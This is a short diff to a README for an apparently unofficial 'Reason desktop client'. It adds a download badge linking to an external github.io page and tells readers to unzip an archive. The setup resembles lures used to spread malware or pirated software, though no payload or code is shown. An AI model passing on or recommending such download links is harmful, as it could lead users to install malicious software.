@@ -6,7 +6,7 @@ This unofficial Reason desktop client brings the renowned music production and s
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://reason-desktop-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
